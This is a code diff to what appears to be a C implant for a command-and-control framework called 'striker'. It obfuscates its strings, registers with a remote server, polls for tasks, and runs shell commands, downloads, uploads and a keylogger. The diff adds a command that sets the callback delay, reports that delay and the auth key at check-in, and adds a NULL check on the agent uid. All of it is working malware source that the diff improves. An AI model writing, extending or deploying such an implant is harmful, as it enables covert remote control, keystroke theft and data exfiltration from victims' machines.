@@ -393,8 +393,8 @@ void *task_executor(void *ptr){
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort"};
-  for (int i = 0; i < 6; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay"};
+  for (int i = 0; i < 7; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -470,10 +470,14 @@ void *task_executor(void *ptr){
     buffer_strcpy(result_buff, strs[1]);
   }else if (!strcmp(tsk->type, cmd_strs[4])){ // Start a keylogger.
     keymon(striker, tsk);
-  }else if (!strcmp(tsk->type, cmd_strs[5])){
+  }else if (!strcmp(tsk->type, cmd_strs[5])){ // Abort the session.
     char msg[] = "[OBFS_ENC]Session aborted!";
     buffer_strcpy(result_buff, obfs_decode(msg));
     striker->abort = 1;
+  }else if (!strcmp(tsk->type, cmd_strs[6])){
+    char msg[] = "[OBFS_ENC]Callback delay updated!";
+    striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
+    buffer_strcpy(result_buff, obfs_decode(msg));
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
@@ -504,8 +508,8 @@ void start_session(){
   obfs_decode(BASE_URL);
   char strs[][50] = {
     "[OBFS_ENC]/tmp/", "[OBFS_ENC]Connection: close", "[OBFS_ENC]Content-Type: application/json",
-    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key"};
-  for (int i = 0; i < 7; i++)
+    "[OBFS_ENC]/agent/init", "[OBFS_ENC]uid", "[OBFS_ENC]/agent/tasks/%s", "[OBFS_ENC]key", "[OBFS_ENC]delay"};
+  for (int i = 0; i < 8; i++)
     obfs_decode(strs[i]);
   // Default session setup.
   session *striker = malloc(sizeof(session));
@@ -530,7 +534,8 @@ void start_session(){
   post_headers = curl_slist_append(post_headers, strs[2]);
   buffer *body = create_buffer(0); // Dynamic buffer for receiving response body.
   cJSON *info = sysinfo();
-  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(strdup(striker->auth_key)));
+  cJSON_AddItemToObject(info, strs[6], cJSON_CreateString(AUTH_KEY));
+  cJSON_AddItemToObject(info, strs[7], cJSON_CreateNumber(striker->delay));
   tmp = cJSON_PrintUnformatted(info);
   cJSON_Delete(info);
 
@@ -561,6 +566,10 @@ void start_session(){
     goto end;
   }
   tmp = cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(config, strs[4]));
+  if (tmp == NULL){
+    cJSON_Delete(config);
+    goto end;
+  }
   strncpy(striker->uid, tmp, AGENT_UID_SIZE - 1);
   #ifdef STRIKER_DEBUG
     printf("[*] Agent config: %s\n", config_str);
